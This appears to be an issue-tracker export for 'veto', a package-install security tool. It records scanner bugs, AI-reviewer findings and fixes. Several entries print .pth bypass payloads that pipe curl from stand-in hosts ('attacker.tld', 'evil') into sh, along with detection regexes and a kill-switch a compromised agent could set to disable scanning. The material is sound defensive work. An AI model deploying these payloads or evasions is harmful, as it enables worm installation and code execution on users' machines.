title: wrappers classifier: symlink → Mach-O in known pm dir is wrappable by default, not 'foreign wrapper'
description:
Currently, install-wrappers classifies /opt/homebrew/bin/python3 (symlink to /opt/homebrew/Cellar/python@3.14/3.14.3_1/.../bin/python3.14) as ClassForeignWrapper and SKIPs it unless --force. But this IS the canonical Homebrew install layout. Skipping it breaks the install-all one-shot promise.

Same for /opt/homebrew/bin/npm → ../lib/node_modules/npm/bin/npm-cli.js, /opt/homebrew/bin/pip3 → Cellar/python@3.14/.../bin/pip3, /opt/homebrew/bin/go → Cellar/go/1.26.2/libexec/bin/go, /opt/homebrew/bin/bun → Cellar/bun/1.2.16/bin/bun, etc.

Fix: pmsurvey.ClassifySymlink (or the install-wrappers classifier — whichever owns this verdict) should treat a symlink whose final target is a Mach-O / executable inside a KNOWN package-manager dir as ClassRealBinary (wrappable), not ClassForeignWrapper.

Known pm dirs (already covered by pmsurvey.WellKnownBinDirs and similar):
- /opt/homebrew/Cellar/* and /opt/homebrew/opt/* (Homebrew on Apple Silicon)
- /usr/local/Cellar/* (Homebrew on Intel)
- ~/.local/share/mise/installs/*
- ~/.local/share/uv/python/*
- ~/.rustup/toolchains/*/bin (rustup managed)
- /opt/homebrew/lib/node_modules/* (npm-cli.js etc.)

The 'foreign wrapper' verdict should be reserved for symlinks whose target is NONE of the above AND not a veto binary — i.e. a binary the user (or another tool) genuinely planted as a custom wrapper. That's the case --force should still gate.

Acceptance:
- veto install-wrappers on a clean Homebrew install (no --force) wraps /opt/homebrew/bin/python3, /opt/homebrew/bin/npm, /opt/homebrew/bin/pip3, etc. — none SKIPped as 'foreign wrapper'.
- A genuinely foreign wrapper (e.g. a shell script wrapping python3 at /usr/local/bin/python3 planted by the user) IS still SKIPped without --force.
- Test fixtures cover both cases: Homebrew-style symlink (wrapped by default) and genuine foreign wrapper (SKIPped).
close_reason: 4402b34: new ClassPMLayoutSymlink verdict for Homebrew/mise/npm-cli.js/rustup/etc layouts; wrappable by default, --force gate stays for genuine foreign wrappers

title: fold repair-shims + repair-wrappers into install-*; remove them as top-level commands; update doctor hints

title: P0: pthscan misses `import\t` (tab-separated import) — worm bypass
description:
**File:** `internal/pthscan/pthscan.go:166`

**Bypass payload (bytes):**
```
import\tos; os.system('curl -sS https://attacker.tld/bun | sh')\n
```
(byte between `import` and `os` is `0x09`, not `0x20`)

**Why CPython executes it:** `site.py:213` uses `line.startswith(("import ", "import\t"))` — both space AND tab.

**Why pthscan misses it:** `executableLines()` only checks `"import "` / `"import("` / bare `"import"`. No `"import\t"` arm. Line never enters `scanPayloadSignals`; `os.system` never observed; verdict: SeverityNone.

**Verifier evidence:** `TestVerifierClaim1_TabSeparatorBypass/evil-pth-no-setup-suffix` returns `Severity: none, Signals: []` — full bypass. With `*-setup.pth` filename, payload still missed; only filename signal fires (`Severity: medium`).

**Recommended fix:**
```go
if strings.HasPrefix(trimmed, "import ") ||
   strings.HasPrefix(trimmed, "import\t") ||   // ← add
   strings.HasPrefix(trimmed, "import(") ||
   trimmed == "import" {
```

Defensively: consider also `\f`, `\v` (other whitespace CPython tokenizer accepts), or pivot to byte-class check after the `"import"` prefix.

**Reproducer test:** `go test ./internal/pthscan/ -run TestVerifierClaim1_TabSeparatorBypass -v` (already in tree; promote `t.Logf` to `require.Equal(t, pthscan.SeverityCritical, v.Severity)` after fix).

**Discovery chain:** found by kimi-k2.6 (security, wave-1), confirmed via empirical CPython execution proof by qwen3.7-max (adversarial), confirmed via Go test by sonnet-4.6 (verifier).
close_reason: Implemented in commit dd6d3c7: added isImportPrefix helper covering CPython site.py + tokenizer whitespace (space/tab/form-feed/vt) plus the `import(` and bare `import` shapes; promoted TestVerifierClaim1 to require assertions with the os.system payload + form-feed sub-case.

title: P3: dead code in pthscan/wheel — RECORD-branch predicate + unused recordEntries

- (b) delete the entire RECORD-parse block until something needs it

title: P1: Python-PM target-dir flags (`pip install --target`) silently ignored
description:
**Files:** `cmd/veto/pth_preflight.go:123` (`pthScanRootsForInstall`) calling into `cmd/veto/gyp_target_dir.go:8-23` (`installTargetDirFlags`).

**Bug:** `installTargetDirFlags` map has entries ONLY for npm/pnpm/yarn/bun. For any Python PM (pip / pip3 / uv / uvx / pipx / poetry / pdm) the lookup returns no flags and `installTargetDir` falls through to `return cwd`.

**Repro:** `pip install --target /opt/x pkg` from `cwd=/tmp` → `pthScanRootsForInstall` returns `[/tmp]`. Actual install tree at `/opt/x/lib/python3.*/site-packages` is never walked. Pre-existing `.pth` worm under that target dir is invisible to BOTH the install hot-path preflight (`cmd/veto/main.go:473`) AND the Claude Code hook (`cmd/veto/hook.go:147-150`).

**Why this matters:** the docstring at `pth_preflight.go:107` ADVERTISES `pip install --target ./vendor` support. It doesn't work. The npm side has `TestRunClaudeCodeHook_BindingGypWormPrefixTargetDeniesEarly` for this exact bug. There is no Python analogue.

**Severity rationale:** P1 (not P0) because the bypass requires the user to invoke `pip install --target <dir>`, which is uncommon. But it's a hard-coded false negative — the defense is silently disabled. The advertised behavior is a lie.

**Recommended fix:** extend `installTargetDirFlags` with:
- pip / pip3: `--target` / `-t`, `--prefix`, `--root`
- uv (`uv pip`): same as pip
- poetry: `--directory` / `-C`
- pdm: `--project` / `-p`

Mirror the `gyp_target_dir_test.go` test cases for Python PMs. Add a `TestClaudeCodeHook_PthWormPipTargetDeniesEarly` test analogous to the npm one.

**Note:** synthesis report (`.claude/HADES_REVIEW_REPORT.md`) did NOT promote this to its P1 list. That's a synthesis-stage miss — it's a real P1 the correctness reviewer caught and the report buried. Filing here to make sure it lands.

**Discovery chain:** opus-4.7 (correctness, wave-1).
close_reason: Implemented in commit 0daf425: extended installTargetDirFlags with pip/pip3/uv entries for --target/-t/--prefix/--root, added 22 table-driven unit tests and TestRunClaudeCodeHook_PthWormPipTargetDeniesEarly, updated pthScanRootsForInstall docstring. Edge-case beads for --prefix/--root precision (veto-9ls) and poetry/pdm verification (veto-l4t) filed.

title: P1: pthscan spawn regex misses `os.spawn*` family (only catches `os.exec*`)
description:
**File:** `internal/pthscan/pthscan.go:206`

**Bypass:** spawn regex is `\b(?:subprocess|os\.system|os\.popen|popen|pty\.spawn|os\.exec[a-z]*)\b`. Covers `os.exec*` but NOT `os.spawn*` (spawnl, spawnle, spawnlp, spawnv, spawnve, spawnvp, spawnvpe).

**Concrete payload:**
```python
import os; os.spawnlp(os.P_WAIT, 'sh', 'sh', '-c', 'curl http://evil | sh')
```

**Why this matters:** the line still goes through `executableLines()` (matches `"import "` prefix) and runs `scanPayloadSignals`, but none of the 6 payload groups match. Result: SeverityMedium (executable-line only). Below the install-hot-path refusal threshold. Install proceeds.

**Severity rationale:** P1 — confirmed bypass, but requires attacker to use `os.spawn*` family which is less common than `os.system`/`subprocess`. Real Hades campaign uses `subprocess.Popen` which IS caught. But a variant author who reads kimi's regex doc would trivially evade.

**Recommended fix:** add `os\.spawn[a-z]*` to the spawn group, or broaden the existing arm to `os\.(?:exec|spawn)[a-z]*`.

**Discovery chain:** kimi-k2.6 (security, wave-1).
close_reason: Implemented in commit 869adf6: spawn regex now `os\.(?:exec|spawn)[a-z]*`; added TestInspectOsSpawnFamilyIsCritical.

title: P1: dynamic-exec regex misses `__import__ (` (whitespace before paren)
description:
**File:** `internal/pthscan/pthscan.go:211`

**Bypass:** dynamic-exec regex is `\b(?:exec\(|eval\(|compile\(|__import__\()`. Requires `(` immediately after the name with no whitespace. Python accepts whitespace between identifier and `(`.

**Concrete payload:**
```python
__import__ ('urllib.request').urlopen('http://evil')
```

**Why this matters:** same as veto-3w1.14 (spawn family) — line goes through `executableLines()`, gets SeverityMedium, install proceeds. Trivial 1-char bypass.

**Recommended fix:** allow optional whitespace: `\b(?:exec|eval|compile|__import__)\s*\(`.

**Note:** same fix would also re-protect against an `__import__\t(` tab variant.

**Discovery chain:** kimi-k2.6 (security, wave-1).
close_reason: Implemented in commit cbd2a20: regex now `\b(?:exec|eval|compile|__import__)\s*\(`; TestInspectDynamicExecWithWhitespaceBeforeParen covers zero-space, single-space, and tab variants.

title: P1: `getattr(__builtins__, 'exec')(...)` bypasses ALL payload groups
description:
**File:** `internal/pthscan/pthscan.go:195-237` (`payloadGroups`)

**Bypass:** a `.pth` line containing `getattr(__builtins__, 'exec')('import os; os.system("evil")')` achieves arbitrary code execution without matching ANY of the six payload-group regexes. `getattr` is not in network, spawn, dynamic-exec, deobfuscation, runtime-fetch, or marker groups. Doesn't match any allowlist either.

**Concrete payload:**
```python
import os; getattr(__builtins__, 'exec')('import os; os.system("evil")')
```

Result: SeverityMedium (executable-line only) — install proceeds.

**Why this matters:** this is the broader pattern — ANY way of retrieving a dangerous builtin via attribute access (`getattr`, `globals()`, `vars()`, `__builtins__['exec']`) bypasses the payload regexes. The veto-3w1.5 defense-in-depth content-body scan would partially mitigate by catching `getattr` itself as a suspicious token in a `.pth`.

**Recommended fix:** add `getattr` to the dynamic-exec group, OR add a catch-all for `__builtins__`/`builtins` access patterns that retrieve dangerous functions. Realistically: any `getattr(<thing>, 'exec'|'eval'|'compile'|'__import__'|'system'|'popen'|...)` should be flagged.

**Discovery chain:** kimi-k2.6 (security, wave-1). Verifier did NOT test this one (synthesis dropped it from the P1 list — another synthesis-stage miss).
close_reason: Implemented in commit 064af27: added getattr to dynamic-exec group, plus a new pth-payload-builtins-access group catching __builtins__/builtins references (attribute, subscript, or module). TestInspectBuiltinsAccessIsCritical covers five indirection shapes.

title: P1: `VETO_PTH_WHEEL_SCAN=off` is an attacker-settable kill switch
description:
**File:** `cmd/veto/pth_wheel.go:32-44` (`pthWheelScanMode`)

**Bypass:** a compromised agent/subprocess can `export VETO_PTH_WHEEL_SCAN=off` (or `0`, `false`, `no`) before invoking pip. The wheel prescan is then skipped entirely. Variable is not gated by signed config or by a config file's existence.

**Why this matters:** requires prior compromise of the agent/environment to set the env var, but it's a one-line off switch for a critical defense layer. Any agent already running malicious code can disable the next defense for itself.

**Severity rationale:** P1 — requires prior foothold, but the defense should be at least observable/loggable when disabled. Right now it's silent.

**Recommended fix (in order of strictness):**
1. (minimal) when prescan is disabled via env, log loudly at INFO/WARN and emit in the install summary so the user knows.
2. (better) require an explicit config file entry (`.veto/config.yaml` or similar) to disable, not just an env var.
3. (best) bind the disable to a flag that can be set per-invocation but is logged each time.

Don't accept `0`/`false`/`no` as silent disable values — only `off` should turn it off, and only loudly.

**Note:** the equivalent VETO_GYP_TARBALL_SCAN switch already exists and has the same property. If you address this one, address that one in the same PR for consistency.

**Discovery chain:** kimi-k2.6 (security, wave-1). Synthesis dropped from P1 list — third synthesis-stage miss.
close_reason: Implemented: only 'off' disables scan; WARN log + user-visible message emitted when disabled; legacy 0/false/no values no longer silently disable; unrecognised values get a WARN too. Commit 9b087a0.

title: P2: `hadesWorkflowExfilRe` curl+POST+secrets branch can't span YAML lines
description:
**File:** `internal/scan/agentsurface/agentsurface.go:156`

**Bug:** first alternative of `hadesWorkflowExfilRe` is `curl\s+[^\n]*-X\s*POST[^\n]*\$\{\{\s*secrets\.`. The `(?s)` flag only affects `.`, not character classes — `[^\n]*` still refuses to span newlines.

**Repro:** real GitHub Actions exfil workflows split `curl`, `-X POST`, the URL, and `${{ secrets.X }}` across multiple lines inside a `run: |` block. That common shape evades this branch entirely.

**Coverage:** the other three alternatives (`toJson(secrets)`, `webhook.site`, `webhooks?\.<domain>/`) still match a slice of patterns. So coverage degrades, not disappears.

**Side observation:** `(?s)` is currently dead in this regex — no literal `.` appears.

**Recommended fix:** either:
- replace `[^\n]*` with `.*` and rely on `(?s)` to make `.` match newlines
- decompose into two independent any-position checks: (curl -X POST anywhere in file) AND (`${{ secrets.` anywhere in file)

Add a multi-line workflow exfil fixture in `agentsurface_test.go` (test gap explorer flagged).

**Discovery chain:** opus-4.7 (correctness, wave-1).
close_reason: Fixed: replaced [^\n]* with .*? in first alternative of hadesWorkflowExfilRe; (?s) now active and meaningful. Multi-line YAML run-block exfil shape now detected. Commit 7c18a19 on fix/hades-bundle-e-agentsurface.

title: P2: `fileNameSetupRe` misses bare `setup.pth` (no leading `-`/`_`)
description:
**File:** `internal/pthscan/pthscan.go:220`

**Bug:** `fileNameSetupRe = (?i)[-_]setup\.pth$` requires `-` or `_` immediately before `setup`. A file named exactly `setup.pth` does not trigger the filename signal.

**Repro:**
```go
pthscan.Inspect(Input{PthContent: []byte("some/path\n"), FileName: "setup.pth"})  // → SeverityNone
pthscan.Inspect(Input{PthContent: []byte("some/path\n"), FileName: "x-setup.pth"}) // → SeverityMedium
```
One-character rename defeats the structural backstop.

**Why this matters:** the filename signal exists as a backstop for cases where the payload itself doesn't match (e.g. the BOM + tab + multi-line CR cases). When the body fails to flag, the filename catches `*-setup.pth` shape — except a single-rename worm with bare `setup.pth` slips through both.

**Recommended fix:** `(?i)(^|[-_])setup\.pth$`. Add `TestInspectBareSetupFilenameAloneIsMedium` test.

**Discovery chain:** opus-4.7 (correctness, wave-1).
close_reason: Implemented in commit b7d5940: fileNameSetupRe widened to (^|[-_])setup.pth$; TestInspectBareSetupFilenameAloneIsMedium added.

title: P0: pthscan does not strip UTF-8 BOM — worm bypass
description:
**File:** `internal/pthscan/pthscan.go:127` (`content := string(in.PthContent)`) and `:166` (the `HasPrefix("import ")` check).

**Bypass payload (bytes):**
```
\xEF\xBB\xBFimport os; os.system('curl -sS https://attacker.tld/bun | sh')\n
```

**Why CPython executes it:** `site.py` opens `.pth` in binary mode, strips leading `codecs.BOM_UTF8`, decodes UTF-8, then runs `splitlines()`. BOM is invisible to the line scanner. Verified: `b'\xef\xbb\xbfimport os; ...'.decode("utf-8-sig").splitlines()[0].startswith(("import ", "import\t"))` returns `True`.

**Why pthscan misses it:** `Inspect` does `string(in.PthContent)` with no BOM strip. First line becomes `"\xEF\xBB\xBFimport os; ..."`. `TrimLeft(line, " \t")` only strips ASCII spaces/tabs. `trimmed` still starts with BOM bytes. `HasPrefix(trimmed, "import ")` checks against `0xEF` (not `i`/`0x69`) — false. Line treated as inert path entry; payload scanning never runs.

**Verifier evidence:** `TestVerifierClaim3_UTF8BOMBypass` returns `Severity: none, Signals: []` — full bypass.

**Recommended fix:**
```go
// In Inspect(), before `content := string(in.PthContent)`:
raw := in.PthContent
if bytes.HasPrefix(raw, []byte{0xEF, 0xBB, 0xBF}) {
    raw = raw[3:]
}
content := string(raw)
```

**Belt-and-braces:** also reject UTF-16 BOMs (`FF FE`, `FE FF`) by returning Critical "unscannable encoding". CPython won't execute UTF-16 `.pth` anyway, but gives attacker no cover.

**Reproducer test:** `go test ./internal/pthscan/ -run TestVerifierClaim3_UTF8BOMBypass -v` (in tree; promote to assertion after fix).

**Discovery chain:** kimi-k2.6 (security, wave-1) flagged "UTF-8 BOM" as category concern but no proof. qwen3.7-max (adversarial) constructed empirical CPython execution + pthscan test proving the bypass. sonnet-4.6 (verifier) re-confirmed via independent Go test.

**Operational note:** this is the finding that paid for model-lineage diversity in this review. claude-lineage reviewers didn't construct the proof; qwen did.
close_reason: Implemented in commit 6a7bccb: bytes.TrimPrefix(utf8BOM) before string conversion in Inspect(); UTF-16 BOMs (LE+BE) return SeverityCritical with new pth-unscannable-encoding signal. Promoted TestVerifierClaim3 to assertions; added TestInspectUTF16BOMIsCritical.

title: P2: TOCTOU between wheel scan (pip download) and actual pip install
description:
**File:** `cmd/veto/pth_wheel.go:155-195`

**Threat:** the index can serve different wheels for the same name@version between scan and install.

**Attack flow:** scan downloads wheel via `pip download`, inspects, then a separate `pip install` runs. An adversary controlling the index (or leveraging a race in package publishing) could serve a clean wheel for scan and a malicious wheel for install. Platform-specific wheel selection can also differ between two pip invocations.

**Confidence:** structural gap confirmed by kimi's source-trace.

**Recommended mitigation:**
- (best) cache the verified wheel hash from scan and enforce it during install
- (cheap) use `pip install --no-index --find-links <scanned-dir>` to pin install to the wheels veto already verified
- (also cheap) verify wheel digests against PyPI's reported hashes before AND after scan

**Severity:** P2 because the attack requires the adversary to control or race the index, which is plausible (PyPI is rate-limited but not authenticated for downloads) but unusual.

**Discovery chain:** kimi-k2.6 (security, wave-1).

title: P3: zip bomb DoS — no decompression ratio guard in wheel scanner
description:
**File:** `internal/pthscan/wheel/wheel.go:55-70`

**Threat:** denial-of-service, not worm bypass.

**Detail:** wheel scanner limits total entries (`maxWheelEntries = 100_000`) and per-file bytes (`maxPthBytes = 256 * 1024`) but has no decompression ratio guard. A zip bomb (small compressed archive that expands to GB) could cause `io.ReadAll` to consume memory before hitting the `LimitReader` cap.

**Severity:** P3. Real impact: a malicious wheel hosted on PyPI could DoS veto users. The user would notice (memory spike, slow install) but the install would still complete fail-open per current design.

**Recommended fix:** wrap entry reads in `io.LimitReader` before `io.ReadAll`, OR cap total decompressed bytes per zip (e.g. 256 MB).

**Discovery chain:** kimi-k2.6 (security, wave-1).
close_reason: Implemented in commit 0cb50cf: added maxWheelDecompressedBytes=256MB constant and totalDecompressed accumulator in collectPthEntries. TestInspectZipBombRejected verifies a 1025-entry zip bomb (263MB decompressed, ~200KB on disk) is rejected with error containing 'decompressed size exceeds limit'.

title: P3: wheel scanner should explicitly reject zip symlink entries
description:
**File:** `internal/pthscan/wheel/wheel.go:55-60`

**Issue:** currently the wheel scanner reads `.pth` files in-memory and never extracts to disk, so symlink entries are not directly exploitable. But if extraction is ever added (e.g. for richer content analysis), a malicious wheel with a symlink entry pointing outside the zip could affect that path.

**Recommendation:** defense-in-depth — add explicit rejection of zip entries with `ModeType & os.ModeSymlink != 0` in `collectPthEntries`. Latent risk only; document the choice if you skip.

**Discovery chain:** kimi-k2.6 (security, wave-1).
close_reason: Implemented in commit 58761e2: added f.Mode()&os.ModeSymlink!=0 guard in collectPthEntries with explanatory comment. TestInspectSkipsSymlinkEntries verifies symlink entries in purelib paths are silently skipped.

title: P3: sync pthWheelScanTimeout to gypTarballScanTimeout (120s → 90s)
description:
**Files:** `cmd/veto/pth_wheel.go:26` ↔ `cmd/veto/gyp_tarball.go:24`

**Observation:** `pthWheelScanTimeout = 120 * time.Second` (Python side) vs `gypTarballScanTimeout = 90 * time.Second` (npm side). Asymmetric SLA for the same conceptual operation (download + inspect package archive from registry).

**Why it matters:** users hitting registry timeouts experience different maximum delays depending on which package manager they invoked. inconsistent UX across ecosystems. one of the two constants is the right one; pick.

**Recommended direction:** sync `pthWheelScanTimeout` down to 90s to match. wheel downloads from PyPI are not meaningfully slower than tarball downloads from npm. if there's a real reason (e.g. PyPI's CDN cold-start latency is genuinely worse), document it inline.

**Discovery:** flagged by gemini-3.1-pro-preview (architecture reviewer, wave 1 of multi-agent review 2026-06-10). gemini's full output landed in disk artifacts (arch-1.md / msg.json) instead of the findings channel due to channel_post tool unavailability at the time, so this finding did not get into the original bead set. surfaced when cleaning up working-tree artifacts post-merge.

description:

title: P1: sdist-only wheel prescan fails open — worm lands without inspection
description:
**File:** `cmd/veto/pth_wheel.go:85–93` (call site) and `:165–200` (`downloadAndInspectWheel`).

**Why this is real:** `downloadAndInspectWheel` shells out to `pip download --no-deps --only-binary :all:`. For sdist-only packages, `pip download` returns success with no `.whl`, function returns `fmt.Errorf("pip download %s produced no wheel ...")`. Caller (line 88-89):
```go
if err != nil {
    logger.Warn().Err(err).Str("spec", tgt.spec()).Msg(".pth wheel preflight: fetch/inspect failed; skipping this package")
    continue
}
```
Fail-open. Worm proceeds to `pip install`, which builds sdist, drops `.pth` into venv, detonates on next `python` startup. Existing-tree scan catches it only on *next* install, after damage done.

**Recommended fix:** distinguish "no wheel exists" from "transient fetch error" and fail-closed on the former. Either:
- (a) after failed `--only-binary :all:` download, retry with `pip index versions <name>` (or `pip download --no-deps --no-binary :all:`) to verify whether sdists exist; if so, refuse with clear "sdist-only package; veto refuses to fall back to build-time inspection" message.
- (b) cheaper: parse `pip download` stderr for canonical "Could not find a version that satisfies the requirement" / "No matching distribution found", treat both that and `produced no wheel` as fail-closed.

**Severity rationale:** P1 (not P0) because attacker must ship sdist-only — less likely shape than wheel-bundled `.pth`. Real Hades worm needs `.data/purelib/` path so it ships wheels. But a sdist-capable Hades variant becomes the primary install vector once you assume sdist-capable adversaries.

**Reproducer:** no automated test exists. Build by hand: publish local sdist with malicious `setup.py` writing `.pth` at build time, point pip at it, observe veto's pth-preflight allowing the install.

**Discovery chain:** qwen3.7-max (adversarial) flagged from source-trace; sonnet-4.6 (verifier) confirmed the fail-open path by reading runGate ordering. No live pip in environment so no E2E test — source-traced only.
close_reason: Implemented: errSdistOnly sentinel type; pip output parsed for 'no matching distribution' / 'could not find version' messages; both non-zero exit (sdist message) and zero-exit-no-wheel cases return errSdistOnly; caller in pthWheelPreflight fails-closed with user-visible refusal message. Commit c6d7227.

title: P2: pthscan line splitter only recognizes `\n` — multi-line `\r`-only files defeat gate
description:
**File:** `internal/pthscan/pthscan.go:154` (`executableLines` loop).

**Issue:** the line splitter only breaks on `'\n'`. CPython's `site.py` uses `str.splitlines()` which breaks on `\r`, `\n`, `\r\n`, `\u0085`, `\u2028`, `\u2029`.

**Single-line CR-only case (NOT a bypass):** `TestVerifierClaim2_CROnlyLineEndings` returned `Severity: critical`, `Signals: [pth-payload-spawn]` — caught via implicit end-of-buffer terminator + `TrimSuffix("\r")`. qwen claimed P0; verifier refuted P0 status.

**Multi-line CR-only case (still a bypass):** e.g. `"# comment\rimport os; os.system('x')\r"` — collapses into one logical line whose `TrimLeft` lands on `#`, marking it inert. CPython sees 2 lines and executes line 2. Untested but follows directly from the splitter logic.

**Recommended fix:** extend the splitter to break on the same set CPython does. Simplest:
```go
lines := strings.FieldsFunc(content, func(r rune) bool {
    return r == '\n' || r == '\r' || r == '\u0085' || r == '\u2028' || r == '\u2029'
})
```
or write a small `isCPythonLineTerm` predicate.

**Note:** this is the same shape of issue as P0-1 (`import\t`) and P0-2 (BOM). Root cause framing from qwen: *pthscan reimplements Python's line parsing instead of matching CPython's exact algorithm.* See P2 epic on defense-in-depth content-body scan (`veto-3w1.5`).

**Discovery chain:** opus-4.7 (correctness, wave-1) flagged P2 with caveat. qwen3.7-max escalated to P0 incorrectly. sonnet-4.6 (verifier) refuted the P0 escalation but the multi-line case remains.

Implemented in commit b1ee114: replaced

Tests cover content-only catch, documented FP, distutils regression, and de-dup.

title: P2: document why wheel scanner only matches `.data/purelib/` and `.data/platlib/`
description:
**File:** `internal/pthscan/wheel/wheel.go:144` (`isPthInWheel`).

**Issue:** wheel scanner only matches `.data/purelib/` and `.data/platlib/`. Adversarial (qwen) flagged `.data/scripts/`, `.data/headers/`, `.data/data/` as missing.

**Verifier's verdict:** REFUTED — only `purelib`/`platlib` land on `sys.path`, so `.pth` files in `scripts/headers/data` are never executed by `site.py`. Confirmed via `sysconfig.get_paths()`:
- `purelib` → site-packages ✓ (loaded)
- `platlib` → site-packages ✓ (loaded)
- `scripts` → `/opt/homebrew/bin` ✗
- `headers` → `/opt/homebrew/include/...` ✗
- `data` → `/opt/homebrew` ✗

**Action required:** ADD A COMMENT to `isPthInWheel` explaining this design choice and citing PEP 427 + site.py behavior. Without the comment, a future reader might "helpfully" broaden the regex defensively and admit false positives (legitimate `.pth` files in scripts/headers/data that pip places but Python never loads).

**No code change.** Pure docs/comment.

**Discovery chain:** qwen3.7-max flagged as P2 coverage gap; sonnet-4.6 (verifier) refuted with sysconfig evidence; synthesis (opus-4.7) recommended the documentation note.
close_reason: Implemented in commit 41e1720: added a doc-comment table to isPthInWheel explaining PEP 427's five install destinations, which ones land on sys.path (purelib/platlib only), and why checking scripts/headers/data would admit false positives. References CPython site.py, PEP 427, and sysconfig.get_paths() output. Comment lands on the new segment-matching code from veto-3w1.9 (commit c86ae38).

title: P2: Hades intel source uses exact-string version match — PEP 440 variants slip past
description:
**Files:** `internal/intel/sources/hades/hades.go` + `internal/intel/normalize.go:38` (`NormalizeVersion` for `EcosystemPyPI` falls through to `default: return version`).

**Issue:** hades.go stores `{name: "ensmallen", version: "0.8.6"}`. Lookup for `ensmallen==0.8.6.post1` misses `byVersion[{PyPI, "ensmallen", "0.8.6.post1"}]` (different string). Also misses `byName` sweep (`r.Version != ""` AND `r.Range == nil` — neither switch case fires). Result: not flagged.

**PyPI publishing reality:**
- `0.8.6.post1` IS publishable on PyPI — realistic attack vector
- `0.8.6+local` CANNOT be published (PyPI rejects local labels)
- `0.8.6rc1` sorts BEFORE `0.8.6` (pre-release of unreleased version)

**Severity rationale:** P2 because:
- hades static list is explicitly a stopgap (per design spec)
- pthscan content heuristic catches the worm regardless of version string
- bypassed layer is belt-and-braces only

**Recommended fix:** either (a) store hades entries as version ranges (`introduced: "0.8.6", last_affected: "0.8.6"`) with range-aware lookup, OR (b) add a PyPI normalization case to `NormalizeVersion` that strips `.post0` and normalizes to PEP 440 canonical form. Option (a) is structurally cleaner.

**Discovery chain:** qwen3.7-max (adversarial); sonnet-4.6 (verifier) confirmed via source-trace.
close_reason: Added normalizePyPIVersion to NormalizeVersion (EcosystemPyPI case) using the existing parsePEP440Version parser. Canonical form: strips local label, normalizes pre/post/dev separators, normalizes epoch. 25 test cases + Hades variant tests + canonical-form assertion on all hades entries. Commit da811dd.

title: P3: replace pthscan hand-rolled byte loop with `strings.FieldsFunc` over CPython line-terminator set
description:
**File:** `internal/pthscan/pthscan.go:154` (`executableLines`).

**Issue:** the hand-rolled byte loop is the substrate of three separate findings (P0-1 tab, P0-2 BOM, P2 multi-line CR). Replacing it with `strings.FieldsFunc` over a CPython-equivalent terminator set (`\n`, `\r`, `\u0085`, `\u2028`, `\u2029`) eliminates a whole class of "we forgot to handle X line terminator" bugs.

**Recommendation:** after veto-3w1.1 (tab), veto-3w1.2 (BOM), and veto-3w1.4 (multi-line CR) are fixed, consider a follow-up refactor that adopts FieldsFunc as the canonical splitter. This is structural improvement, not a bug fix.

**Discovery chain:** synthesis (opus-4.7) recommended; novel observation across qwen's root-cause framing.
close_reason: Implemented in commit 3371b1a: dropped one-field executableLine struct for []string; expanded isCPythonLineTerm comment with full str.splitlines() table + FieldsFunc rationale + future-reader warning. No behavior change; all tests green.

title: P3: tighten wheel-zip `isPthInWheel` path check to filepath-segment matching
description:
**File:** `internal/pthscan/wheel/wheel.go` (`isPthInWheel`).

**Issue:** the check uses substring matching on `.data/purelib/` rather than path-segment matching. A wheel entry named `foo.data/purelib/../../etc/passwd.pth` would slip through if `path.Clean` were ever bypassed.

**Current state:** leading-`/` and `..` guards above are present and correct. Substring check is currently safe but defense-in-depth via `filepath.Match`-style segment check would be tighter.

**Recommendation:** one-line tightening to use proper path-segment match. Pure paranoia, no current exploit.

**Discovery chain:** synthesis (opus-4.7).
close_reason: Implemented in commit c86ae38: replaced strings.Contains substring check with segment-position matching (split on '/', require segment ending in '.data' immediately followed by 'purelib' or 'platlib'). TestInspectIsPthInWheelSegmentCheck covers legitimate purelib, scripts/ rejection, and crafted segment sequences.

title: install-wrappers: re-classify candidates at wrap time, not just at discovery (dup of veto-ynv.4)
description:
discoverWrapCandidates runs pmsurvey.ClassifySymlink once at discovery time. When the wrap loop processes candidates, an earlier wrap can change a later candidate's effective target — the cached verdict goes stale.

Concrete case (from veto-ynv.4): bun is Mach-O at discovery, gets wrapped, becomes a veto symlink. bunx (relative symlink './bun' in same dir) now resolves through veto. Its cached ClassForeignWrapper verdict is stale; the right action is sibling-multiplexer wrap (bunx.veto-original → ./bun.veto-original).

Fix: at the top of applyWrapper(c), re-classify c instead of trusting c.class. This is dirt-cheap (a few stats) and removes a footgun class.

This bead is essentially a duplicate of veto-ynv.4. Link it as a blocker / dup. Closing one closes the other.

Acceptance: same as veto-ynv.4. After 'veto install-wrappers' on a clean mise install of bun, both bun and bunx are wrapped; bunx --version works; no infinite loop.
close_reason: 6c0d764: applyWrapper re-classifies via pmsurvey.ClassifySymlink at the top of every call so cached discovery-time verdicts can't go stale (bun→bunx case)

title: install-wrappers: prune stale wrappers.json entries every run (path missing OR sibling missing)
description:
install-wrappers does not reconcile wrappers.json against on-disk state at the top of each run. Result: when an entry's path no longer exists (uninstalled, moved, mise upgraded version) or its .veto-original sibling is gone (manually deleted, repair-shims, etc.), the entry sits stale and veto doctor FAILs it forever.

Fix: at the top of every install-wrappers run, walk wrappers.json. For each entry:
- If 'path' does not exist on disk → remove entry (with log line).
- If '.veto-original' sibling does not exist → either (a) remove entry, OR (b) attempt to re-wrap the original path (if the original path is recoverable from context). Prefer (a) for simplicity; (b) requires more state.

This is part of the convergence-loop semantics — install-wrappers must read current disk, reconcile, then create what's missing. Today it only creates.

Acceptance:
- Planted wrappers.json with N entries where M point to missing paths/siblings → after install-wrappers, the N-M legit entries remain and the M stale entries are gone.
- Bryn's box: after the dzk2 series lands, running install-wrappers cleans whatever stale entries remain from the recovery debacle.

title: EPIC: make install-all the only command — convergence over write-once across all 4 layers
description:
UX goal: 'make install && veto install-all' is the ONLY install/repair command users ever need to think about. It applies or reapplies all 4 layers, reconciles any drift, and converges on a working state regardless of starting state.

Why we are not there today: each install-* command was written write-once ('create the wrap, record state') rather than convergence-loop ('read current disk, reconcile to desired state'). When drift happens (stale .veto-original siblings, bogus wrappers.json entries, foreign symlinks where we already wrapped, etc.) install-* skips or errors. We have been adding repair-* commands and --force flags as band-aids per drift case.

Acceptance test for this epic: starting from ANY local state — including a freshly-broken state like the one veto-dzk created — running 'make install && veto install-all' produces a fully working installation with veto doctor green. No other commands needed. repair-* commands do not exist. doctor's recovery hints point only at install-all.

Children: pruning bogus wrappers.json entries in shim dir, smarter classifier for known pm-dir symlinks, stale-entry pruning, removing repair-* commands, re-classify at wrap time.

title: Wrapper install/doctor discovery asymmetry + broken-symlink robustness
description:
